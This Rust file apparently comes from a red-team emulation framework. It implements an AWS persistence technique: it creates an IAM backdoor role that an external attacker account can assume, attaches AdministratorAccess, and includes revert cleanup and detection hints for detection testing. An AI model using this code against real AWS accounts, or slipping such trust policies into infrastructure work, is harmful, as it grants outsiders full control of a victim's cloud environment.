use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const ATTACKER_ACCOUNT_ID: &str = "012345678901";
const ADMIN_POLICY_ARN: &str = "arn:aws:iam::aws:policy/AdministratorAccess";

async fn detonate_impl(_outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let role_name = format!("stratus-red-team-backdoor-{}", uuid::Uuid::new_v4().simple());

    let trust_policy = serde_json::json!({
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {
                "AWS": format!("arn:aws:iam::{}:root", ATTACKER_ACCOUNT_ID)
            },
            "Action": "sts:AssumeRole"
        }]
    });

    let trust_policy_str = serde_json::to_string(&trust_policy)
        .map_err(|e| anyhow::anyhow!("Failed to serialize trust policy: {}", e))?;

    aws.iam
        .create_role()
        .role_name(&role_name)
        .assume_role_policy_document(&trust_policy_str)
        .tags(
            aws_sdk_iam::types::Tag::builder()
                .key("StratusRedTeam")
                .value("true")
                .build()
                .map_err(|e| anyhow::anyhow!("{}", e))?,
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    aws.iam
        .attach_role_policy()
        .role_name(&role_name)
        .policy_arn(ADMIN_POLICY_ARN)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Created backdoor IAM role: {} (trusted by attacker account {})",
        role_name, ATTACKER_ACCOUNT_ID
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(_outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;

    let list_result = aws.iam
        .list_roles()
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    for role in list_result.roles() {
        if !role.role_name().starts_with("stratus-red-team-backdoor-") {
            continue;
        }

        let role_name = role.role_name();

        // Detach policies
        let policies_result = aws.iam
            .list_attached_role_policies()
            .role_name(role_name)
            .send()
            .await
            .map_err(|e| anyhow::anyhow!("{}", e))?;

        for policy in policies_result.attached_policies() {
            let detach = aws.iam
                .detach_role_policy()
                .role_name(role_name)
                .policy_arn(policy.policy_arn().unwrap_or(""))
                .send()
                .await;

            match detach {
                Err(e) => {
                    let msg = format!("{}", e);
                    if msg.contains("NoSuchEntity") || msg.contains("NotFound") || msg.contains("not found") {
                        // ignore
                    } else {
                        return Err(anyhow::anyhow!("{}", e));
                    }
                }
                Ok(_) => {}
            }
        }

        // Delete the role
        let del = aws.iam
            .delete_role()
            .role_name(role_name)
            .send()
            .await;

        match del {
            Err(e) => {
                let msg = format!("{}", e);
                if msg.contains("NoSuchEntity") || msg.contains("NotFound") || msg.contains("not found") {
                    // ignore
                } else {
                    return Err(anyhow::anyhow!("{}", e));
                }
            }
            Ok(_) => {
                println!("Deleted backdoor IAM role: {}", role_name);
            }
        }
    }

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.persistence.iam-create-backdoor-role",
        friendly_name: "Create Backdoor IAM Role",
        description: "Creates a new IAM role with a trust policy allowing an external attacker account to assume it, with AdministratorAccess attached.",
        detection: "CloudTrail: CreateRole, AttachRolePolicy. GuardDuty: Policy:IAMUser/AnomalousBehavior.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
